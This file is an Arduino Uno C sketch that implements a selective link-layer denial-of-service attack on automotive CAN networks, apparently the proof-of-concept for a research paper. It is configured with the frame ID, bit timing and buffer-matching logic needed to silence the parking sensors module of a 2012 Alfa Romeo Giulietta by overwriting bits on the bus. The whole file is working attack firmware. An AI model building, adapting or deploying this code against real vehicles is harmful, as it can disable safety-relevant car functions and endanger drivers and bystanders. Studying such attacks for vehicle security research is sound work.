/* 
 *  "A Stealth, Selective, Link-layer Denial-of-Service Attack Against Automotive Networks"
 *  Arduino Uno Rev 3 DoS Implementation
 *  
 *  Uno R3 specific implementation changes with respect to proposed attack algorithm:
 *  - First RXD falling edge waiting and Attack ISR enabling implemented via another ISR
 *    (RXD Falling Edge ISR) which monitors the RXD value and triggers on RXD falling edge;
 *  - Buffer is split into two variables due to size requirements reasons;
 *  - In Attack ISR, after dominant bit writing, Attack ISR disables itself for  
 *    performance optimizations reasons. It is re-enabled by RXD Falling Edge ISR;
 *  - In Attack ISR, slightly increased overwriting time in order to compensate 
 *    for possible Arduino interrupts timing drifts.
 *    
 *  Implementation is set to perform the DoS attack against the 2012 Alfa Romeo Giulietta
 *  parking sensors module (identifier 06314018) on CAN B operating at 29 bit / 50 kbps.
 *  
 *  CAN target value explaination:
 *  254 -> 11111110 | 832209432 -> 00110001100110101000001000011000;
 *  1111111000110001100110101000001000011000;
 *  1111111 = preceding data EoF/remote EoF/error delimiter/overload
 *            delimiter + minimum interframe spacing;
 *  0 = SoF;
 *  00110001100 = Base ID;
 *  1 = SRR;
 *  1 = IDE;
 *  0101000001000011000 = Extended ID + 1 stuff bit.
 */

byte CANBuffer1 = 0;
unsigned long CANBuffer2 = 0;

void setup() {
  noInterrupts();
  
  // TXD <- Recessive
  pinMode(2, INPUT_PULLUP);
  pinMode(4, OUTPUT);
  digitalWrite(4, 1);
  
  // Buffer <- 111...1
  CANBuffer1 = 255;
  CANBuffer2 = 4294967295;
  
  // Set timer to expire every CAN bit time seconds
  TIMSK2 = 0;
  TCCR2A = 0;
  TCCR2B = 0;
  OCR2A = 39;
  bitSet(TCCR2A, WGM21);
  TCNT2 = 38;
  bitSet(TIFR2, OCF2A);
  bitSet(TIMSK2, OCIE2A);
  
  // Enable RXD Falling Edge ISR
  EIMSK = 0;
  EICRA = 0;
  bitSet(EICRA, ISC01);
  bitSet(EIFR, INTF0);
  bitSet(EIMSK, INT0);
  
  interrupts();
}

void loop() {
}

ISR(INT0_vect) {
  EIMSK = 0; // Disable RXD Falling Edge ISR
  bitSet(TCCR2B, CS21); // Enable Attack ISR
}

ISR(TIMER2_COMPA_vect) {
  if (CANBuffer1 == 254 && CANBuffer2 == 832209432){
    delayMicroseconds(36); // Wait until first recessive bit
    bitClear(PORTD,4); // TXD <- Dominant
    delayMicroseconds(24); // Wait CAN bit time seconds
    bitSet(PORTD,4); // TXD <- Recessive

    // Disable Attack ISR
    TCCR2B = 0;
    TCNT2 = 38;
    bitSet(TIFR2, OCF2A);

    // Buffer <- 111...1
    CANBuffer1 = 255;
    CANBuffer2 = 4294967295;
    
    // Enable RXD Falling Edge ISR
    bitSet(EIFR, INTF0);
    bitSet(EIMSK, INT0);
  } else {
    // Append RXD value to Buffer
    CANBuffer1 = CANBuffer1 << 1;
    CANBuffer1 = CANBuffer1 | bitRead(CANBuffer2, 31);
    CANBuffer2 = CANBuffer2 << 1;
    CANBuffer2 = CANBuffer2 | bitRead(PIND, 2);
  }
}
